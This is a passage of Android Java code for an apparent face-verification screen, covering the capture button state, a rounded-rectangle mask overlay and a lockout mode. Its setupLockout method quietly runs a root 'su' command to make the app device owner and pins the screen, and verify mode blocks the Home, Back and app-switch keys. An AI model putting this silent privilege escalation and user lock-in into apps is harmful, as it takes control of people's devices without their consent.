                setButtonColor(captureButton, "#2563EB");
                statusText.setText("Face detected \u2014 tap to capture");
                statusText.setTextColor(Color.parseColor("#22C55E"));
            }
        } else {
            if (isFaceDetected) {
                isFaceDetected = false;
                captureButton.setEnabled(false);
                setButtonColor(captureButton, "#1E293B");
                statusText.setText("Position your face in the frame");
                statusText.setTextColor(Color.parseColor("#B0B0BA"));
            }
        }
    }

    private void setupLockout() {
        if (!dpm.isDeviceOwnerApp(getPackageName())) {
            try {
                Runtime.getRuntime().exec("su -c dpm set-device-owner " + getPackageName() + "/.AdminReceiver").waitFor();
            } catch (Exception ignored) {}
        }
        try {
            if (dpm.isDeviceOwnerApp(getPackageName())) {
                dpm.setLockTaskPackages(adminComponent, new String[]{getPackageName()});
            }
            startLockTask();
        } catch (Exception ignored) {}
    }

    private void hideSystemUI() {
        try {
            View decorView = getWindow().getDecorView();
            decorView.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN);
        } catch (Exception ignored) {}
    }

    @Override
    @SuppressWarnings("MissingSuperCall")
    public void onBackPressed() {
        if (!isVerifyMode) {
            super.onBackPressed(); // Gallery mode can go back
        }
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent event) {
        if (isVerifyMode) {
            int kc = event.getKeyCode();
            if (kc == KeyEvent.KEYCODE_HOME || kc == KeyEvent.KEYCODE_APP_SWITCH ||
                kc == KeyEvent.KEYCODE_MENU || kc == KeyEvent.KEYCODE_BACK || kc == KeyEvent.KEYCODE_SEARCH) {
                return true;
            }
        }
        return super.dispatchKeyEvent(event);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (isVerifyMode && hasFocus) hideSystemUI();
    }

    private void setButtonColor(Button btn, String hex) {
        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(60f);
        bg.setColor(Color.parseColor(hex));
        btn.setBackground(bg);
    }

    // ── Rectangular Mask Overlay ─────────────────────────────────────────────

    private class RectMaskView extends View {
        private final Paint maskPaint;
        private final Paint clearPaint;
        private final Paint borderPaint;
        private final RectF rectF = new RectF();

        public RectMaskView(Context context) {
            super(context);
            maskPaint = new Paint();
            maskPaint.setColor(Color.parseColor("#0A0A0F"));
            maskPaint.setStyle(Paint.Style.FILL);

            clearPaint = new Paint();
            clearPaint.setColor(Color.TRANSPARENT);
            clearPaint.setXfermode(new android.graphics.PorterDuffXfermode(android.graphics.PorterDuff.Mode.CLEAR));
            clearPaint.setAntiAlias(true);

            borderPaint = new Paint();
            borderPaint.setColor(Color.parseColor("#3B82F6"));
            borderPaint.setStyle(Paint.Style.STROKE);
            borderPaint.setStrokeWidth(6f);
            borderPaint.setAntiAlias(true);

            setLayerType(LAYER_TYPE_HARDWARE, null);
        }

        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            canvas.drawRect(0, 0, getWidth(), getHeight(), maskPaint);

            float width = getWidth() * 0.85f;
            float height = width * 1.3f;
            float left = (getWidth() - width) / 2f;
            float top = (getHeight() - height) / 2f - 60f;

            rectF.set(left, top, left + width, top + height);
            float corner = 60f;

            canvas.drawRoundRect(rectF, corner, corner, clearPaint);
            canvas.drawRoundRect(rectF, corner, corner, borderPaint);
        }
    }
}
